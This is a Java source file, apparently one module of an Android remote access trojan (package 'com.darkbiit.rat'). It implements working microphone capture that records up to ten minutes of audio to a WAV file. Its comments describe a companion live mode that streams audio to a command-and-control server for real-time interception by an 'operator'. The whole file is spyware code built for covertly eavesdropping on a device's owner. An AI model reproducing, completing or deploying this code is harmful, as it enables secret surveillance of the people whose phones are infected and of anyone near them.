package com.darkbiit.rat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Microphone capture.
 *
 * Two modes:
 *   - "file": records a WAV file (PCM, 16 kHz mono) for the given duration
 *   - "live": streams PCM chunks to the C2 as base64 events while recording
 *
 * The live mode is what makes it useful for real-time interception; the file
 * mode is the fallback when the operator wants the audio as an artifact.
 */
public final class RatMic {

    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNELS = 1;
    private static final int BITS = 16;

    private RatMic() {
    }

    /** Records to a WAV file for {@code seconds} seconds. */
    public static Map<String, Object> recordFile(Context ctx, String outPath, int seconds) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        if (!hasMicPermission(ctx)) {
            out.put("ok", false);
            out.put("error", "RECORD_AUDIO permission not granted");
            return out;
        }
        if (seconds < 1) {
            seconds = 10;
        }
        if (seconds > 600) {
            seconds = 600;
        }

        int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        if (minBuf <= 0) {
            out.put("ok", false);
            out.put("error", "no PCM support on this device");
            return out;
        }
        int bufSize = minBuf * 2;

        AudioRecord rec = null;
        RandomAccessFile raf = null;
        try {
            rec = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize);
            if (rec.getState() != AudioRecord.STATE_INITIALIZED) {
                out.put("ok", false);
                out.put("error", "AudioRecord failed to initialize");
                return out;
            }

            File target = new File(outPath);
            File parent = target.getParentFile();
            if (parent != null && !parent.exists()) {
                //noinspection ResultOfMethodCallIgnored
                parent.mkdirs();
            }
            raf = new RandomAccessFile(target, "rw");
            raf.setLength(0);
            writeWavHeader(raf, 0);

            rec.startRecording();
            long deadline = System.currentTimeMillis() + seconds * 1000L;
            byte[] buf = new byte[4096];
            long total = 0;
            while (System.currentTimeMillis() < deadline) {
                int n = rec.read(buf, 0, buf.length);
                if (n <= 0) {
                    if (n == AudioRecord.ERROR_INVALID_OPERATION || n == AudioRecord.ERROR_BAD_VALUE) {
                        break;
                    }
                    continue;
                }
                raf.write(buf, 0, n);
                total += n;
            }
            try {
                rec.stop();
            } catch (Throwable ignored) {
                // ignore
            }

            // Patch the RIFF sizes now that the length is known.
            raf.seek(0);
            writeWavHeader(raf, total);

            out.put("ok", total > 0);
            out.put("path", target.getAbsolutePath());
            out.put("size", total);
            out.put("seconds", seconds);
            out.put("sample_rate", SAMPLE_RATE);
            if (total <= 0) {
                out.put("error", "no audio captured");
            }
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        } finally {
            if (rec != null) {
                try {
                    rec.release();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
            if (raf != null) {
                try {
                    raf.close();
                } catch (Throwable ignored) {
                    // nothing to do
                }
            }
        }
        return out;
    }

    /** Writes a canonical 44-byte RIFF/WAVE header. */
    private static void writeWavHeader(RandomAccessFile f, long dataLen) throws java.io.IOException {
        long riffSize = 36 + dataLen;
        long byteRate = SAMPLE_RATE * CHANNELS * BITS / 8;
        int blockAlign = CHANNELS * BITS / 8;

        f.writeBytes("RIFF");
        writeIntLE(f, (int) riffSize);
        f.writeBytes("WAVE");
        f.writeBytes("fmt ");
        writeIntLE(f, 16);
        writeShortLE(f, 1);                       // PCM
        writeShortLE(f, CHANNELS);
        writeIntLE(f, SAMPLE_RATE);
        writeIntLE(f, (int) byteRate);
        writeShortLE(f, blockAlign);
        writeShortLE(f, BITS);
        f.writeBytes("data");
        writeIntLE(f, (int) dataLen);
    }

    private static void writeIntLE(RandomAccessFile f, int v) throws java.io.IOException {
        f.write(v & 0xff);
        f.write((v >> 8) & 0xff);
        f.write((v >> 16) & 0xff);
        f.write((v >> 24) & 0xff);
    }

    private static void writeShortLE(RandomAccessFile f, int v) throws java.io.IOException {
        f.write(v & 0xff);
        f.write((v >> 8) & 0xff);
    }

    private static boolean hasMicPermission(Context ctx) {
        return ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }
}
